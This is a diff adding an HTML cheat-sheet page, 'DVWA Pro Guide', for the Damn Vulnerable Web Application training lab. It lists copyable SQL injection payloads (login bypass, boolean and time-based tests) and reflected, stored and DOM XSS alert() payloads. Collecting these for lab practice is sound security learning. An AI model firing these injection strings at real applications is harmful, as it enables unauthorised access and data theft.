@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>DVWA Pro Guide</title>
+
+<style>
+body {
+    font-family: Arial;
+    margin: 0;
+    background: #f4f6f8;
+    transition: 0.3s;
+}
+.dark {
+    background: #1e1e1e;
+    color: white;
+}
+.container {
+    width: 90%;
+    margin: auto;
+    padding: 20px;
+}
+h1 {
+    text-align: center;
+}
+
+.topbar {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 20px;
+}
+
+input {
+    padding: 10px;
+    width: 60%;
+    border-radius: 8px;
+    border: 1px solid #ccc;
+}
+
+button {
+    padding: 10px;
+    border: none;
+    border-radius: 6px;
+    cursor: pointer;
+    background: #007BFF;
+    color: white;
+}
+
+.tabs button {
+    margin-right: 10px;
+}
+
+.card {
+    background: white;
+    padding: 20px;
+    margin: 15px 0;
+    border-radius: 12px;
+    box-shadow: 0 0 10px rgba(0,0,0,0.1);
+}
+.dark .card {
+    background: #2c2c2c;
+}
+
+code {
+    display: block;
+    background: #eee;
+    padding: 10px;
+    border-radius: 6px;
+    margin-top: 10px;
+}
+.dark code {
+    background: #444;
+}
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+<h1>💣 DVWA Pro Guide</h1>
+
+<div class="topbar">
+<input type="text" id="search" placeholder="🔍 Search..." onkeyup="search()">
+<button onclick="toggleDark()">🌙 Dark</button>
+</div>
+
+<div class="tabs">
+<button onclick="showTab('sql')">SQL Injection</button>
+<button onclick="showTab('xss')">XSS</button>
+</div>
+
+<!-- SQL -->
+
+<div id="sql" class="tab">
+
+<div class="card">
+<h3>Bypass Login</h3>
+<code>' OR '1'='1</code>
+<button onclick="copy(this)">📋 Copy</button>
+</div>
+
+<div class="card">
+<h3>True Condition</h3>
+<code>1' AND 1=1--</code>
+<button onclick="copy(this)">📋 Copy</button>
+</div>
+
+<div class="card">
+<h3>False Condition</h3>
+<code>1' AND 1=2--</code>
+<button onclick="copy(this)">📋 Copy</button>
+</div>
+
+<div class="card">
+<h3>Time Based</h3>
+<code>1' AND SLEEP(5)--</code>
+<button onclick="copy(this)">📋 Copy</button>
+</div>
+
+</div>
+
+<!-- XSS -->
+
+<div id="xss" class="tab" style="display:none;">
+
+<div class="card">
+<h3>Reflected</h3>
+<code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
+<button onclick="copy(this)">📋 Copy</button>
+</div>
+
+<div class="card">
+<h3>Stored</h3>
+<code>&lt;script&gt;alert('Stored')&lt;/script&gt;</code>
+<button onclick="copy(this)">📋 Copy</button>
+</div>
+
+<div class="card">
+<h3>DOM</h3>
+<code>?default=&lt;script&gt;alert('DOM')&lt;/script&gt;</code>
+<button onclick="copy(this)">📋 Copy</button>
+</div>
+
+</div>
+
+</div>
+
+<script>
+function copy(btn) {
+    let code = btn.previousElementSibling.innerText;
+    navigator.clipboard.writeText(code);
+    btn.innerText = "✅ Copied";
+    setTimeout(() => btn.innerText = "📋 Copy", 1500);
+}
+
+function toggleDark() {
+    document.body.classList.toggle("dark");
+}
+
+function showTab(tab) {
+    document.querySelectorAll(".tab").forEach(t => t.style.display = "none");
+    document.getElementById(tab).style.display = "block";
+}
+
+function search() {
+    let input = document.getElementById("search").value.toLowerCase();
+    let cards = document.querySelectorAll(".card");
+
+    cards.forEach(card => {
+        let text = card.innerText.toLowerCase();
+        card.style.display = text.includes(input) ? "" : "none";
+    });
+}
+</script>
+
+</body>
+</html>
